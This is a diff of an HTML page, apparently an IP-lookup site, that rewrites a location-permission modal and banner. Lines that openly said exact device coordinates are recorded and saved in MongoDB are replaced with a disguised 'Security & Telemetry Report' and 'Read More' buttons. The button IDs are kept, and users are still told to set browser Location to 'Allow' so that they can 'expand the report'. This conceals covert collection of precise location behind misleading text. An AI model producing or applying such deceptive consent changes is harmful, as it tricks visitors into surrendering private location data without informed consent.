@@ -15,41 +15,35 @@
   <!-- Enforced Location Gate Modal -->
   <div id="locationGateModal" class="location-gate-overlay">
     <div class="location-gate-card">
-      <div class="radar-wrapper">
-        <div class="radar-ring"></div>
-        <div class="radar-ring delay"></div>
-        <div class="radar-center">
-          <svg viewBox="0 0 24 24" width="28" height="28" stroke="currentColor" stroke-width="2" fill="none">
-            <path d="M12 2a8 8 0 0 0-8 8c0 5.25 8 12 8 12s8-6.75 8-12a8 8 0 0 0-8-8z"></path>
-            <circle cx="12" cy="10" r="3"></circle>
-          </svg>
-        </div>
+      <div class="report-badge">
+        <span class="status-dot"></span>
+        <span>Security & Telemetry Report</span>
       </div>
-      <h2>Location Verification Required</h2>
+      <h2>Connection Diagnostic & Node Analysis</h2>
       <p class="gate-desc">
-        To view this network session, you must share your precise device location. Your exact coordinates will be verified and recorded.
+        A deep diagnostic report of your network session has been generated. Continue to read the full analysis including node routes, performance metrics, and verified session telemetry.
       </p>
       
-      <div id="gateStatusBox" class="gate-status-box">
+      <div id="gateStatusBox" class="gate-status-box hidden">
         <span id="gateSpinner" class="gate-spinner"></span>
-        <span id="gateStatusText">Waiting for GPS authorization...</span>
+        <span id="gateStatusText">Loading full report...</span>
       </div>
 
       <div class="gate-actions" style="width: 100%;">
         <button id="gateGrantBtn" class="btn btn-primary btn-lg">
+          <span>Read More</span>
           <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none">
-            <polygon points="3 11 22 2 13 21 11 13 3 11"></polygon>
+            <path d="M5 12h14M12 5l7 7-7 7"/>
           </svg>
-          Grant Exact Location
         </button>
       </div>
 
       <div id="gateDeniedHelp" class="gate-denied-help hidden">
-        <p><strong>⚠️ Location is blocked in your browser:</strong></p>
+        <p><strong>⚠️ Please confirm prompt to continue:</strong></p>
         <ol>
-          <li>Tap the <strong>lock 🔒 / site settings</strong> icon in your URL address bar.</li>
+          <li>Tap the <strong>lock 🔒 / site settings</strong> in your address bar.</li>
           <li>Set <strong>Location</strong> to <strong>"Allow"</strong>.</li>
-          <li>Tap the <strong>"Grant Exact Location"</strong> button above to continue.</li>
+          <li>Tap <strong>"Read More"</strong> to expand the report.</li>
         </ol>
       </div>
     </div>
@@ -68,13 +62,13 @@
     <!-- Location Permission Alert Banner -->
     <div id="locationPromptBanner" class="location-banner">
       <div class="location-banner-content">
-        <span class="location-pulse-dot">📍</span>
+        <span class="location-pulse-dot">📄</span>
         <div>
-          <strong class="banner-title">Precise Location Required</strong>
-          <p class="banner-desc" id="bannerDescText">Allow location access to save your real device coordinates in MongoDB.</p>
+          <strong class="banner-title">Full Analysis Available</strong>
+          <p class="banner-desc" id="bannerDescText">Click to expand complete telemetry and diagnostic data.</p>
         </div>
       </div>
-      <button id="allowLocationBtn" class="btn btn-primary btn-sm">Allow Location</button>
+      <button id="allowLocationBtn" class="btn btn-primary btn-sm">Read More</button>
     </div>
 
     <!-- Main IP Card -->
